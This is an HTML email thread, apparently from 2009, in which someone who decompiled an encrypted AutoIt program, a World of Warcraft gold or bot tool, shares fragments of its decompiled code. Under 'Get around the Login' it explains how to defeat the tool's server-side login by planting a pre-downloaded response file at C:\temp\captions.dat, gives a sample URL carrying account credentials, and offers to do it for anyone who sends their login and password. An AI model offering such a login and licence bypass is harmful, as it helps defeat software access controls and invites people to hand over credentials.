+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Verdana'>&nbsp;</span></p>
+
+<p class=MsoNormal><b><span style='font-size:10.0pt;font-family:Tahoma;
+color:blue'>Dim</span></b><span style='font-size:10.0pt;font-family:Tahoma'> <b><span
+style='color:#AA0000'>$WOWINF_VER</span></b> <b><span style='color:red'>=</span></b>
+<b><span style='color:#9999CC'>&quot;1.3.2c&quot;</span></b></span></p>
+
+<p class=MsoNormal><b><span style='font-size:10.0pt;font-family:Tahoma;
+color:blue'>Dim</span></b><span style='font-size:10.0pt;font-family:Tahoma'> <b><span
+style='color:#AA0000'>$LITE</span></b> <b><span style='color:red'>=</span></b> <b><i><span
+style='color:#AC00A9'>0</span></i></b></span></p>
+
+<p class=MsoNormal><b><span style='font-size:10.0pt;font-family:Tahoma;
+color:blue'>Dim</span></b><span style='font-size:10.0pt;font-family:Tahoma'> <b><span
+style='color:#AA0000'>$NITRO</span></b> <b><span style='color:red'>=</span></b>
+<b><i><span style='color:#AC00A9'>1</span></i></b></span></p>
+
+<p class=MsoNormal><b><span style='font-size:10.0pt;font-family:Tahoma;
+color:blue'>Dim</span></b><span style='font-size:10.0pt;font-family:Tahoma'> <b><span
+style='color:#AA0000'>$PASSCODE</span></b> <b><span style='color:red'>=</span></b>
+<strong><span style='font-family:Tahoma;color:#9999CC'>'zwowgold.com/bbox/&quot;&gt;'</span></strong></span><span
+style='font-size:10.0pt;font-family:Arial;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Verdana'>&nbsp;</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>so you
+may&nbsp;start the au3-script now as well.&nbsp;</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>I also
+downloaded &amp; decompiled </span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'><a
+href="http://www.ezwowgold.com/data/wowinfinity/patch.dat">http://www.ezwowgold.com/data/wowinfinity/patch.dat</a></span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Verdana'>&nbsp;</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>+ updated
+the 2 lines changed:</span></p>
+
+<p class=MsoNormal><b><span style='font-size:10.0pt;font-family:Tahoma;
+color:blue'>Func</span></b><span style='font-size:10.0pt;font-family:Tahoma'>
+LOGIN<b><span style='color:red'>()</span></b></span></p>
+
+<p class=MsoNormal><b><span style='font-size:10.0pt;font-family:Tahoma;
+color:blue'>While</span></b><span style='font-size:10.0pt;font-family:Tahoma'> <b><span
+style='color:#AA0000'>$LOGIN_OK</span></b> <b><span style='color:red'>=</span></b>
+<b><i><span style='color:#AC00A9'>0</span></i></b></span></p>
+
+<p class=MsoNormal><b><span style='font-size:10.0pt;font-family:Tahoma;
+color:#AA0000'>$MSG</span></b><span style='font-size:10.0pt;font-family:Tahoma'>
+<b><span style='color:red'>=</span></b> <b><i><span style='color:#000090'>GUIGetMsg</span></i><span
+style='color:red'>()</span></b></span></p>
+
+<p class=MsoNormal><b><span style='font-size:10.0pt;font-family:Tahoma;
+color:blue'>Select</span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:10.0pt;font-family:Tahoma;
+color:blue'>Case</span></b><span style='font-size:10.0pt;font-family:Tahoma'> <b><span
+style='color:#AA0000'>$MSG</span></b> <b><span style='color:red'>=</span></b> <b><span
+style='color:#AA0000'>$BUTTON_LOG</span></b></span></p>
+
+<p class=MsoNormal><strong><span style='font-size:10.0pt;font-family:Tahoma;
+color:#AA0000'>&nbsp;</span></strong><span style='font-size:10.0pt;font-family:
+Arial;color:black'>&nbsp;&nbsp;</span><strong><span style='font-size:10.0pt;
+font-family:Tahoma'>...</span></strong></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma;color:blue'>&nbsp;</span><strong><span
+style='font-size:10.0pt;font-family:Tahoma'>Else</span></strong></p>
+
+<p class=MsoNormal><b><span style='font-size:10.0pt;font-family:Tahoma;
+color:#AA0000'>$ARRAY</span></b><span style='font-size:10.0pt;font-family:Tahoma'>
+<b><span style='color:red'>=</span></b> <b><i><span style='color:#000090'>StringSplit</span></i><span
+style='color:red'>(</span><span style='color:#AA0000'>$ARRAY</span><span
+style='color:red'>[</span><i><span style='color:#AC00A9'>2</span></i><span
+style='color:red'>],</span></b> <b><span style='color:#9999CC'>'href=&quot;'</span><span
+style='color:red'>,</span></b> <b><i><span style='color:#AC00A9'>1</span></i><span
+style='color:red'>)</span></b></span></p>
+
+<p class=MsoNormal><b><span style='font-size:10.0pt;font-family:Tahoma;
+color:#AA0000'>$ARRAY</span></b><b><span style='font-size:10.0pt;font-family:
+Tahoma;color:red'>=</span></b><span style='font-size:10.0pt;font-family:Tahoma'>
+<b><i><span style='color:#000090'>STRINGSPLIT</span></i><span style='color:
+red'>(</span><span style='color:#AA0000'>$ARRAY</span><span style='color:red'>[</span><i><span
+style='color:#AC00A9'>2</span></i><span style='color:red'>],</span></b> <b><span
+style='color:#9999CC'>&quot;e&quot;</span><span style='color:red'>,</span></b> <b><i><span
+style='color:#AC00A9'>1</span></i><span style='color:red'>)</span></b></span></p>
+
+<p class=MsoNormal><i><span style='font-size:10.0pt;font-family:Tahoma;
+color:#009933'>;~ $ARRAY = StringSplit($ARRAY[2], &quot;/&quot;, 1)</span></i></p>
+
+<p class=MsoNormal><b><span style='font-size:10.0pt;font-family:Tahoma;
+color:#AA0000'>$PASSCODE</span></b><b><span style='font-size:10.0pt;font-family:
+Tahoma;color:red'>=</span></b><span style='font-size:10.0pt;font-family:Tahoma'>
+<b><span style='color:#AA0000'>$ARRAY</span><span style='color:red'>[</span><i><span
+style='color:#AC00A9'>2</span></i><span style='color:red'>]</span></b></span></p>
+
+<p class=MsoNormal><i><span style='font-size:10.0pt;font-family:Tahoma;
+color:#009933'>;~ $PASSCODE = $ARRAY[6]</span></i></p>
+
+<p class=MsoNormal><b><i><span style='font-size:10.0pt;font-family:Tahoma;
+color:#000090'>ConsoleWrite</span></i></b><b><span style='font-size:10.0pt;
+font-family:Tahoma;color:red'>(</span></b><b><span style='font-size:10.0pt;
+font-family:Tahoma;color:#AA0000'>$PASSCODE</span></b><span style='font-size:
+10.0pt;font-family:Tahoma'> <b><span style='color:red'>&amp;</span></b> <b><span
+style='color:#9999CC'>&quot;JUBIII&quot;</span></b> <b><span style='color:red'>&amp;</span></b>
+<b><span style='color:#FF33FF'>@CRLF</span><span style='color:red'>)</span></b></span></p>
+
+<p class=MsoNormal><b><i><span style='font-size:10.0pt;font-family:Tahoma;
+color:#000090'>ConsoleWrite</span></i></b><b><span style='font-size:10.0pt;
+font-family:Tahoma;color:red'>(</span></b><b><span style='font-size:10.0pt;
+font-family:Tahoma;color:#AA0000'>$ARRAY</span></b><b><span style='font-size:
+10.0pt;font-family:Tahoma;color:red'>[</span></b><b><i><span style='font-size:
+10.0pt;font-family:Tahoma;color:#AC00A9'>3</span></i></b><b><span
+style='font-size:10.0pt;font-family:Tahoma;color:red'>]</span></b><span
+style='font-size:10.0pt;font-family:Tahoma'> <b><span style='color:red'>&amp;</span></b>
+<b><span style='color:#9999CC'>&quot;JUBIII2&quot;</span></b> <b><span
+style='color:red'>&amp;</span></b> <b><span style='color:#FF33FF'>@CRLF</span><span
+style='color:red'>)</span></b></span></p>
+
+<p class=MsoNormal><b><i><span style='font-size:10.0pt;font-family:Tahoma;
+color:#000090'>RegWrite</span></i></b><b><span style='font-size:10.0pt;
+font-family:Tahoma;color:red'>(</span></b><b><span style='font-size:10.0pt;
+font-family:Tahoma;color:#9999CC'>&quot;HKEY_LOCAL_MACHINE\SOFTWARE\winf&quot;</span></b><b><span
+style='font-size:10.0pt;font-family:Tahoma;color:red'>,</span></b><span
+style='font-size:10.0pt;font-family:Tahoma'> <b><span style='color:#9999CC'>&quot;user&quot;</span><span
+style='color:red'>,</span></b> <b><span style='color:#9999CC'>&quot;REG_SZ&quot;</span><span
+style='color:red'>,</span></b> <b><i><span style='color:#0080FF'>_STRINGENCRYPT</span></i><span
+style='color:red'>(</span><i><span style='color:#AC00A9'>1</span></i><span
+style='color:red'>,</span></b> <b><i><span style='color:#000090'>GUICtrlRead</span></i><span
+style='color:red'>(</span><span style='color:#AA0000'>$USR_LOG</span><span
+style='color:red'>),</span></b> <b><span style='color:#9999CC'>&quot;moowoo0x249583093&quot;</span><span
+style='color:red'>,</span></b> <b><i><span style='color:#AC00A9'>2</span></i><span
+style='color:red'>))</span></b></span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>...</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Verdana'>&nbsp;</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>Get around
+the Login</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Verdana'>&nbsp;</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>There is
+some data downloaded from there that is required for execution</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>$WEBDATA =
+&quot;<a href="http://www.ezwowgold.com/data/wowinfinity/InfinityServer.php?ID">http://www.ezwowgold.com/data/wowinfinity/InfinityServer.php?ID</a>=&quot;
+&amp; @HOUR &amp; @MIN &amp; &quot;&amp;USR=&quot; &amp; GUICtrlRead($USR_LOG)
+&amp; &quot;&amp;PASS=&quot; &amp; GUICtrlRead($PW_LOG)</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>But if you
+create a file 'C:\temp\captions.dat' the download is skipped and the data from
+there is used.</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>As
+'$WEBDATA'</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>If you
+have an account replace Guest and 1234 with ya data. &nbsp;Download and store that
+file in 'C:\temp\captions.dat'</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'><a
+href="http://www.ezwowgold.com/data/wowinfinity/InfinityServer.php?ID=">http://www.ezwowgold.com/data/wowinfinity/InfinityServer.php?ID=&quot;1250&quot;&amp;USR=Guest&amp;PASS=1234</a></span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>(Or just
+send me the login and password so I can do.)</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Verdana'>&nbsp;</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Verdana'>&nbsp;</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Tahoma'>So Far</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Verdana'>&nbsp;</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Verdana'>&gt;
+From: cw2k@gmx.de<br>
+&gt; Subject: AW: AutoIT Encrypted Exe<br>
+&gt; Date: Wed, 14 Jan 2009 03:54:24 +0100<br>
+&gt; <br>
+&gt; Please try the current version of http://myauttoexe2.tk/ on ya file.<br>
+&gt; If it don't work send me the file.<br>
+&gt; <br>
+&gt; Regards <br>
+&gt; &lt;cw2k&gt;<br>
+<br>
+</span></p>
+
+<p class=MsoNormal><span style='font-size:10.0pt;font-family:Verdana'>&gt; An:
+cw2k@gmx.de<br>
+&gt; Betreff: AutoIT Encrypted Exe<br>
+&gt; <br>
+&gt; <br>
+&gt;…I have a question about<br>
+&gt; decompiling an encoded script and thought I would come to you for help. Do<br>
+&gt; you think you could decrypt it if I sent the .exe file to you?<br>
+&gt; <br>
+&gt; Thanks in advance </span></p>
+
+<p class=MsoNormal>&nbsp;</p>
+
+</div>
+
+</body>
+
+</html>
